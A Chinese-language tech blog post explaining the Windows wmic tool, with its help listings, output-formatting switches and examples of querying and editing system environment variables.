<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="content-language" content="zh-CN"/>
    <meta name="author" content="WeiyiGeek" />
    <meta name="msvalidate.01" content="5C552FB1D885E0E11D2957EC958C8018" />
    <meta name="shenma-site-verification" content="4c655e91c76be0a93c1b6954c666c9d6_1649049085"/>
    <meta name="bytedance-verification-code" content="lKs4FqwCHSJ3A/c5tT7X" />
    <meta name="sogou_site_verification" content="OC65iET6Bk" />
    
    <title>🌐 wmic命令解析与实例|WeiyiGeek Blog|唯一极客Geek-IT网络安全运维开发技术知识分享-博客站点</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    
    <meta name="keywords" content="系统命令">
    <meta name="Description" content="WeiyiGeek-唯一极客博客站点,关注于网络安全运维,Web安全开发,IOT物联网安全开发,应用开发,分享技术学习知识与入坑解决,提升网络安全技术与自身技术能力,立志维护大众网络安全为己任,做一个对国家有用的人,为实现中华民族伟大复兴的中国梦不懈奋斗">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="/css/jquery/3.5.2-jquery.fancybox.min.css?v=1.6.6" />
    <link rel="stylesheet" href="/css/style.css?v=1.6.6">
    <!--  -->
     <script type="text/javascript" src="/js/custom/articlecost.js?v=1.6.6"></script> 
    <link rel="stylesheet" href="/css/third-party/gitalk.css?v=1.6.6"> 
        
    <script type="text/javascript">
        // Data Center
        var DC = {
          reward:	true,
          lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
          v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}')
        };
    </script>
    <script type="text/javascript">window.lazyScripts=[];</script>
<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="WeiyiGeek Blog" type="application/atom+xml">
</head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg" alt="WeiyiGeek-backgroud">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg" alt="WeiyiGeek-头像">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">WeiyiGeek</h5>
          <a href="mailto:master@weiyigeek.top" title="master@weiyigeek.top" class="mail">
            <span>m</span><span>a</span><span>s</span><span>t</span><span>e</span><span>r</span><span>@</span><span>w</span><span>e</span><span>i</span><span>y</span><span>i</span><span>g</span><span>e</span><span>e</span><span>k</span><span>.</span><span>t</span><span>o</span><span>p</span>
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://weiyigeek.top/img/wechat-search.png" target="_blank">
                  <i class="icon icon-lg icon-wechat"></i>
                </a>
              </li>
            
              <li>
                <a href="https://github.com/weiyigeek" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
              <li>
                <a href="https://t.me/WeiyiGeek" target="_blank">
                  <i class="icon icon-lg icon-telegram"></i>
                </a>
              </li>
            
              <li>
                <a href="https://twitter.com/WeiyiGeek" target="_blank">
                  <i class="icon icon-lg icon-twitter"></i>
                </a>
              </li>
            
              <li>
                <a href="https://weibo.com/615643678" target="_blank">
                  <i class="icon icon-lg icon-weibo"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                首页
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                文章分类
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                文章标签
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                文章归档
              </a>
            </li>
        
            <li class="">
              <a href="/books"  >
                <i class="icon icon-lg icon-book"></i>
                学习书籍
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                关于作者
              </a>
            </li>
        
            <li class="">
              <a href="/links"  >
                <i class="icon icon-lg icon-link"></i>
                站点导航
              </a>
            </li>
        
            <li class="">
              <a href="/img/share-wechat.jpg" target="_blank" >
                <i class="icon icon-lg icon-wechat"></i>
                公众账号
              </a>
            </li>
        
            <li class="">
              <a href="https://space.bilibili.com/385802642" target="_blank" >
                <i class="icon icon-lg icon-youtube-play"></i>
                哔哩哔哩
              </a>
            </li>
        
            <li class="">
              <a href="https://github.com/weiyigeek" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="">
              <a href="https://twitter.com/WeiyiGeek" target="_blank" >
                <i class="icon icon-lg icon-twitter"></i>
                Twitter
              </a>
            </li>
        
            <li class="">
              <a href="https://weibo.com/615643678" target="_blank" >
                <i class="icon icon-lg icon-weibo"></i>
                Weibo
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>wmic命令解析与实例</span>
            
        </div>

        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        

        
            <a href="/atom.xml" class="header-icon pull-right waves-effect waves-circle waves-light">
                <i class="icon icon-lg icon-rss"></i>
            </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg" alt="文章头部背景">
    <div class="container fade-scale">
        <h1 class="title">wmic命令解析与实例</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-05-29T12:35:30.000Z" itemprop="datePublished" class="page-time">
  2019-05-29
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Windows%E5%91%BD%E4%BB%A4/">Windows命令</a></li></ul>


            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
  <article id="post-系统运维/Windows/常用命令/系统高级类命令/wmic命令解析与实例"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">wmic命令解析与实例</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-05-29 20:35:30" datetime="2019-05-29T12:35:30.000Z"  itemprop="datePublished">2019-05-29</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Windows%E5%91%BD%E4%BB%A4/">Windows命令</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <p>[TOC]</p>
<a id="more"></a>
<h2 id="0x00-前言介绍"><a href="#0x00-前言介绍" class="headerlink" title="0x00 前言介绍"></a>0x00 前言介绍</h2><p>描述：WMI的全名为”<code>Windows Management Instrumentation - Windows管理规范</code>“, 从Windows 98开始 Windows操作系统都支持WMI, 它是由一系列工具集组成的可以在本地或者远程管理计算机系统。</p>
<p><strong>WMI 特点:</strong><br>WMI有一组API: 我们不管使用VBScript、PowerShell脚本还是利用C#的来访问WMI的类库，都是因为WMI向外暴露的一组API，通过调用API实现使用指定的类。<br>WMI有一个存储库: 尽管WMI的多数实例数据都不存储在WMI中，但是WMI确实有一个存储库，用来存放提供程序提供的类信息，或者称为类的蓝图或者Schema。<br>WMI有一个Service: 运行有 Winmgmt 的Windows服务,如果停止这个服务所有对WMI的操作都将没有反应。<br>WMI是可扩展性: 基于WMI的可扩展性 WMI对资源的操作，不是它自己实现了什么方法，而完全取决于向它注册的提供程序。</p>
<p><strong>Q: 为啥需要WMIC.exe管理工具?</strong><br>描述: 但是在WMIC出现之前如果要管理WMI系统必须使用一些专门的WMI应用，例如SMS或者使用WMI的脚本编程API，或者使用CIM Studio之类的工具。如果不熟悉C++之类的编程语言或VBScript之类的脚本语言，或者不掌握WMI名称空间的基本知识，要用WMI管理系统是很困难的。</p>
<p><strong>Q: 什么是wmic.exe</strong><br>描述: wmic.exe 是 <code>Windows Management Instrumentation</code> Windows管理工具，提供了从命令行接口和批命令脚本执行系统管理的支持。其不能直接进行执行需要切换终端到<code>C:\Windows\System32\wbem</code>位置下才能进行调用；通过 WMI 实现数据的收集与管理，包括提供注册、请求传送、远程管理、安全管理、查询能力、和脚本编程能力等，其设计初衷之一是为了管理员能更加方便的对远程 windows 主机进行各种日常管理</p>
<p>Tips : WMI是管理员日常必备的强大工具之一是脚本伴侣。</p>
<p><strong>远程管理的先决条件：</strong></p>
<ul>
<li>a.启动<code>Windows Management Instrumentation</code>服务，开放TCP135端口。</li>
<li>b.本地安全策略的“网络访问: 本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”。</li>
</ul>
<p><br></p>
<h3 id="1-语法参数"><a href="#1-语法参数" class="headerlink" title="1.语法参数"></a>1.语法参数</h3><p><strong>系统管理执行脚本界面：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#非交互模式(Non-Interactive mode)</span></span><br><span class="line">wmic &lt;<span class="built_in">command</span>&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment">#交互模式(Interactive mode)</span></span><br><span class="line">运行-&gt;cmd-&gt;wmic</span><br><span class="line">[global switches] &lt;<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>帮助命令：</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">(&lt;别名&gt; [WMI 对象] | &lt;别名&gt; [&lt;路径 <span class="built_in">where</span>&gt;] | [&lt;别名&gt;] &lt;路径 <span class="built_in">where</span>&gt;) [&lt;谓词子句&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以使用以下全局开关:</span></span><br><span class="line">/NAMESPACE           别名在其上操作的命名空间的路径。</span><br><span class="line">/ROLE                包含别名定义的角色的路径。</span><br><span class="line">/NODE                别名在其上操作的服务器。</span><br><span class="line">/IMPLEVEL            客户端模拟级别。</span><br><span class="line">/AUTHLEVEL           客户端身份验证级别。</span><br><span class="line">/LOCALE              客户端应使用的语言 ID。</span><br><span class="line">/PRIVILEGES          启用或禁用所有权限。</span><br><span class="line">/TRACE               将调试信息输出到 stderr。</span><br><span class="line">/RECORD              记录所有输入命令和输出内容。</span><br><span class="line">/INTERACTIVE         设置或重置交互模式。</span><br><span class="line">/FAILFAST            设置或重置 FailFast 模式。</span><br><span class="line">/USER                会话期间要使用的用户。</span><br><span class="line">/PASSWORD            登录会话时要使用的密码。</span><br><span class="line">/OUTPUT              指定输出重定向模式。</span><br><span class="line">/APPEND              指定输出重定向模式。</span><br><span class="line">/AGGREGATE           设置或重置聚合模式。</span><br><span class="line">/AUTHORITY           指定连接的 &lt;授权类型&gt;。</span><br><span class="line">/?[:&lt;BRIEF|FULL&gt;]    用法信息。</span><br><span class="line">有关特定全局开关的详细信息，请键入: switch-name /?</span><br><span class="line"></span><br><span class="line"><span class="comment">#当前角色中可以使用以下别名:</span></span><br><span class="line">ALIAS                    - 对本地系统上可用别名的访问</span><br><span class="line">BASEBOARD                - 基板(也称为主板或系统板)管理。</span><br><span class="line">BIOS                     - 基本输入/输出服务(BIOS)管理。</span><br><span class="line">BOOTCONFIG               - 启动配置管理。</span><br><span class="line">CDROM                    - CD-ROM 管理。</span><br><span class="line">COMPUTERSYSTEM           - 计算机系统管理。</span><br><span class="line">CPU                      - CPU 管理。</span><br><span class="line">CSPRODUCT                - SMBIOS 中的计算机系统产品信息。</span><br><span class="line">DATAFILE                 - 数据文件管理。</span><br><span class="line">DCOMAPP                  - DCOM 应用程序管理。</span><br><span class="line">DESKTOP                  - 用户的桌面管理。</span><br><span class="line">DESKTOPMONITOR           - 桌面监视器管理。</span><br><span class="line">DEVICEMEMORYADDRESS      - 设备内存地址管理。</span><br><span class="line">DISKDRIVE                - 物理磁盘驱动器管理。</span><br><span class="line">DISKQUOTA                - 用于 NTFS 卷的磁盘空间使用量。</span><br><span class="line">DMACHANNEL               - 直接内存访问(DMA)通道管理。</span><br><span class="line">ENVIRONMENT              - 系统环境设置管理。</span><br><span class="line">FSDIR                    - 文件系统目录项管理。</span><br><span class="line">GROUP                    - 组帐户管理。</span><br><span class="line">IDECONTROLLER            - IDE 控制器管理。</span><br><span class="line">IRQ                      - 中断请求线路(IRQ)管理。</span><br><span class="line">JOB                      - 提供对使用计划服务安排的作业的访问。</span><br><span class="line">LOADORDER                - 定义执行依赖关系的系统服务的管理。</span><br><span class="line">LOGICALDISK              - 本地存储设备管理。</span><br><span class="line">LOGON                    - 登录会话。</span><br><span class="line">MEMCACHE                 - 缓存内存管理。</span><br><span class="line">MEMORYCHIP               - 内存芯片信息。</span><br><span class="line">MEMPHYSICAL              - 计算机系统的物理内存管理。</span><br><span class="line">NETCLIENT                - 网络客户端管理。</span><br><span class="line">NETLOGIN                 - 网络登录信息(属于特定用户)管理。</span><br><span class="line">NETPROTOCOL              - 协议(及其网络特征)管理。</span><br><span class="line">NETUSE                   - 活动网络连接管理。</span><br><span class="line">NIC                      - 网络接口控制器(NIC)管理。</span><br><span class="line">NICCONFIG                - 网络适配器管理。</span><br><span class="line">NTDOMAIN                 - NT 域管理。</span><br><span class="line">NTEVENT                  - NT 事件日志中的项目。</span><br><span class="line">NTEVENTLOG               - NT 事件日志文件管理。</span><br><span class="line">ONBOARDDEVICE            - 主板(系统板)中内置的通用适配器设备的管理。</span><br><span class="line">OS                       - 已安装操作系统的管理。</span><br><span class="line">PAGEFILE                 - 虚拟内存文件交换管理。</span><br><span class="line">PAGEFILESET              - 页面文件设置管理。</span><br><span class="line">PARTITION                - 物理磁盘的已分区区域的管理。</span><br><span class="line">PORT                     - I/O 端口管理。</span><br><span class="line">PORTCONNECTOR            - 物理连接端口管理。</span><br><span class="line">PRINTER                  - 打印机设备管理。</span><br><span class="line">PRINTERCONFIG            - 打印机设备配置管理。</span><br><span class="line">PRINTJOB                 - 打印作业管理。</span><br><span class="line">PROCESS                  - 进程管理。</span><br><span class="line">PRODUCT                  - 安装程序包任务管理。</span><br><span class="line">QFE                      - 快速修复工程。</span><br><span class="line">QUOTASETTING             - 卷上的磁盘配额设置信息。</span><br><span class="line">RDACCOUNT                - 远程桌面连接权限管理。</span><br><span class="line">RDNIC                    - 对特定网络适配器的远程桌面连接管理。</span><br><span class="line">RDPERMISSIONS            - 特定远程桌面连接的权限。</span><br><span class="line">RDTOGGLE                 - 远程打开或关闭远程桌面侦听程序。</span><br><span class="line">RECOVEROS                - 操作系统出现故障时将从内存收集的信息。</span><br><span class="line">REGISTRY                 - 计算机系统注册表管理。</span><br><span class="line">SCSICONTROLLER           - SCSI 控制器管理。</span><br><span class="line">SERVER                   - 服务器信息管理。</span><br><span class="line">SERVICE                  - 服务应用程序管理。</span><br><span class="line">SHADOWCOPY               - 卷影副本管理。</span><br><span class="line">SHADOWSTORAGE            - 卷影副本存储区域管理。</span><br><span class="line">SHARE                    - 共享资源管理。</span><br><span class="line">SOFTWAREELEMENT          - 系统上安装的软件产品元素的管理。</span><br><span class="line">SOFTWAREFEATURE          - SoftwareElement 的软件产品子集的管理。</span><br><span class="line">SOUNDDEV                 - 声音设备管理。</span><br><span class="line">STARTUP                  - 当用户登录到计算机系统时自动运行的命令的管理。</span><br><span class="line">SYSACCOUNT               - 系统帐户管理。</span><br><span class="line">SYSDRIVER                - 基本服务的系统驱动程序管理。</span><br><span class="line">SYSTEMENCLOSURE          - 物理系统外壳管理。</span><br><span class="line">SYSTEMSLOT               - 物理连接点(包括端口、插槽和外设以及专用连接点)的管理。</span><br><span class="line">TAPEDRIVE                - 磁带驱动器管理。</span><br><span class="line">TEMPERATURE              - 温度传感器(电子温度计)数据管理。</span><br><span class="line">TIMEZONE                 - 时区数据管理。</span><br><span class="line">UPS                      - 不间断电源(UPS)管理。</span><br><span class="line">USERACCOUNT              - 用户帐户管理。</span><br><span class="line">VOLTAGE                  - 电压传感器(电子电压表)数据管理。</span><br><span class="line">VOLUME                   - 本地存储卷管理。</span><br><span class="line">VOLUMEQUOTASETTING       - 将磁盘配额设置与特定磁盘卷相关联。</span><br><span class="line">VOLUMEUSERQUOTA          - 每用户存储卷配额管理。</span><br><span class="line">WMISET                   - WMI 服务操作参数管理。</span><br><span class="line"></span><br><span class="line"><span class="comment">#帮助说明:</span></span><br><span class="line"><span class="comment">#有关特定别名的详细信息，请键入: alias /?</span></span><br><span class="line"><span class="comment">#有关 CLASS/PATH/CONTEXT 的详细信息，请键入: (CLASS | PATH | CONTEXT) /?</span></span><br><span class="line">CLASS     - 按 Esc 键可获取完整 WMI 架构</span><br><span class="line">PATH      - 按 Esc 键可获取完整 WMI 对象路径</span><br><span class="line">CONTEXT   - 显示所有全局开关的状态</span><br><span class="line">QUIT/EXIT - 退出程序</span><br></pre></td></tr></table></figure></p>
<p>如：我要查看process命令的帮助，键入：wmic process /?后显示如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#PROCESS - 进程管理。提示: BNF 的别名用法。</span></span><br><span class="line">(&lt;别名&gt; [WMI 对象] | &lt;别名&gt; [&lt;路径 <span class="built_in">where</span>&gt;] | [&lt;别名&gt;] &lt;路径 <span class="built_in">where</span>&gt;) [&lt;谓词子句&gt;]。</span><br><span class="line"></span><br><span class="line"><span class="comment">#用法:</span></span><br><span class="line">PROCESS ASSOC [&lt;格式说明符&gt;]</span><br><span class="line">PROCESS CALL &lt;方法名称&gt; [&lt;实际参数列表&gt;]</span><br><span class="line">PROCESS CREATE &lt;分配列表&gt;</span><br><span class="line">PROCESS DELETE</span><br><span class="line">PROCESS GET [&lt;属性列表&gt;] [&lt;获取开关&gt;]</span><br><span class="line">PROCESS LIST [&lt;列表格式&gt;] [&lt;列表开关&gt;]</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="Call-函数高级用法"><a href="#Call-函数高级用法" class="headerlink" title="Call - 函数高级用法"></a>Call - 函数高级用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ChangeSecurityPermissions</span><br><span class="line">Compress</span><br><span class="line">Copy</span><br><span class="line">Delete</span><br><span class="line">GetEffectivePermission</span><br><span class="line">Rename</span><br><span class="line">TakeOwnerShip</span><br><span class="line">Uncompress</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="Out-以文件的形式输出获取的内容"><a href="#Out-以文件的形式输出获取的内容" class="headerlink" title="Out - 以文件的形式输出获取的内容"></a>Out - 以文件的形式输出获取的内容</h3><p>简单示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -Commands</span></span><br><span class="line">CLASS <span class="comment">#从WMIC的默认别名模式中转义，直接访问WMI模式中的类。</span></span><br><span class="line">PATH  <span class="comment">#从WMIC的默认别名模式中转义，直接访问WMI模式中的实例。</span></span><br><span class="line">WMIC CONTEXT <span class="comment">#显示所有全局开关的当前值。</span></span><br><span class="line"><span class="comment"># NAMESPACE             : root\cimv2</span></span><br><span class="line"><span class="comment"># ROLE                  : root\cli</span></span><br><span class="line"><span class="comment"># NODE(S)               : WEIYIGEEK</span></span><br><span class="line"><span class="comment"># IMPLEVEL              : IMPERSONATE</span></span><br><span class="line"><span class="comment"># [AUTHORITY            : N/A]</span></span><br><span class="line"><span class="comment"># AUTHLEVEL             : PKTPRIVACY</span></span><br><span class="line"><span class="comment"># LOCALE                : ms_804</span></span><br><span class="line"><span class="comment"># PRIVILEGES            : ENABLE</span></span><br><span class="line"><span class="comment"># TRACE                 : OFF</span></span><br><span class="line"><span class="comment"># RECORD                : N/A</span></span><br><span class="line"><span class="comment"># INTERACTIVE           : OFF</span></span><br><span class="line"><span class="comment"># FAILFAST              : OFF</span></span><br><span class="line"><span class="comment"># OUTPUT                : STDOUT</span></span><br><span class="line"><span class="comment"># APPEND                : STDOUT</span></span><br><span class="line"><span class="comment"># USER                  : N/A</span></span><br><span class="line"><span class="comment"># AGGREGATE             : ON</span></span><br><span class="line">WMIC QUIT    <span class="comment">#Exit from WMIC.</span></span><br><span class="line">WMIC EXIT    <span class="comment">#Exit from WMIC.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># - 特殊命令获取信息进行输出</span></span><br><span class="line">wmic /output:路径 &lt;<span class="built_in">command</span>&gt; get 字段1,字段2；</span><br><span class="line">WMIC /OUTPUT:c:\ClassOutput.htm CLASS Win32_SoundDevice</span><br><span class="line">WMIC /OUTPUT:c:\PathOutput.txt PATH Win32_SoundDevice GET /VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># - 格式化输出格式选择以及选择指定字段</span></span><br><span class="line"><span class="comment"># /FORMAT:VALUE|LIST|CSV|HFORM|HTABLE|MOF|RAWXML|TABLE|XML|htable-sortby</span></span><br><span class="line"><span class="comment"># /get：字段1,字段2 #及查询命令需要显示列值的标题</span></span><br><span class="line">PS C:\Windows\System32\wbem&gt; wmic PATH Win32_SoundDevice GET SystemName,Status  /Format:VALUE</span><br><span class="line"><span class="comment"># Status=OK</span></span><br><span class="line"><span class="comment"># SystemName=WEIYIGEEK</span></span><br><span class="line"></span><br><span class="line">wmic /output:d:\install.txt product get name,version</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="0x01-系统配置"><a href="#0x01-系统配置" class="headerlink" title="0x01 系统配置"></a>0x01 系统配置</h2><h3 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h3><p>描述:ENVIRONMENT系统环境设置管理;<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ENVIRONMENT ASSOC [&lt;格式说明符&gt;]</span><br><span class="line">ENVIRONMENT CREATE &lt;分配列表&gt;</span><br><span class="line">ENVIRONMENT DELETE</span><br><span class="line">ENVIRONMENT GET [&lt;属性列表&gt;] [&lt;获取开关&gt;]</span><br><span class="line">ENVIRONMENT LIST [&lt;列表格式&gt;] [&lt;列表开关&gt;]</span><br><span class="line">ENVIRONMENT SET [&lt;分配列表&gt;] <span class="comment">#属性设置操作。</span></span><br></pre></td></tr></table></figure></p>
<p>基础实例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.环境变量摘要信息显示-&gt;&gt; Full显示所有、Brief显示摘要、Instance显示实例、Status显示状态</span></span><br><span class="line">wmic environment list brief</span><br><span class="line"><span class="comment"># Name                      UserName             VariableValue</span></span><br><span class="line"><span class="comment"># CLASSPATH                 &lt;SYSTEM&gt;             .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.获取指定环境变量的值以及所属用户</span></span><br><span class="line">wmic ENVIRONMENT <span class="built_in">where</span> <span class="string">"name='temp'"</span> get UserName,VariableValue  <span class="comment">#获取temp环境变量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.更改设置的环境变量属性支持cmd中%%符号</span></span><br><span class="line">wmic ENVIRONMENT <span class="built_in">where</span> <span class="string">"name='path' and username='&lt;system&gt;'"</span> <span class="built_in">set</span> VariableValue=<span class="string">"%path%;e:\tools"</span>  <span class="comment">#系统用户-更改path环境变量值,新增e:\tools</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#4.#新增系统环境变量home,值为%HOMEDRIVE%%HOMEPATH%</span></span><br><span class="line">wmic ENVIRONMENT create name=<span class="string">"home"</span>,username=<span class="string">"&lt;system&gt;"</span>,VariableValue=<span class="string">"%HOMEDRIVE%%HOMEPATH%"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#5.删除home环境变量</span></span><br><span class="line">wmic ENVIRONMENT <span class="built_in">where</span> <span class="string">"name='home'"</span> delete</span><br></pre></td></tr></table></figure><br><figure class="image-box">
                <a rel=wmic命令解析与实例 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115172241.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115172241.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p><br></p>
